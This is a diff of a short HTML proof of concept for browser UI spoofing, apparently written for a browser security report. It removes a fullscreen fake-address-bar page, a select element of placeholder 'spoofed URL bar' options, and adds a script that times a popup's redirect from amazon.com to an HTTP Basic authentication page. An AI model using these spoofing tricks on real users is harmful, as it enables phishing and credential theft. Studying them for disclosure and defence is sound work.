@@ -1,96 +1,15 @@
 
+<script>
+  function next() {
+	           setTimeout(function(){w.location.replace('https://jigsaw.w3.org/HTTP/Basic/');}, 1200)
 
 
-<!DOCTYPE html>
-<html>
-<head>
+        }
 
-<style type="text/css">
+  function f() {
+    w = window.open("javascript:location='https://www.amazon.com'","new","width=600 height=800");
+    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
+  }
+</script>
 
-body {
-  overflow-x:hidden;
-  overflow-y:hidden;
-  margin: 0;
-  padding: 0;
-}
-
-select { width:100%; height:1489px; }
-
-</style>
-	
-</head>
-		<script>
-		function start(){
-			
-			var x = document.getElementById('fwiw');
-			x.click();
-			
-			}
-		
-	</script>
-	
-<input type="button" value="Click here first" onclick="document.documentElement.webkitRequestFullscreen();" id="foo">
-<body>
-  <select id="fwiw" style="display=none;" onclick="document.documentElement.webkitRequestFullscreen();">
-    <option>Image of spoofed URL bar goes here Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option selected>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-    <option>Image of spoofed URL bar goes here
-  </select>
-
-</body>
-</html>
-
+<a href="#" onclick="f()">Click here</a>
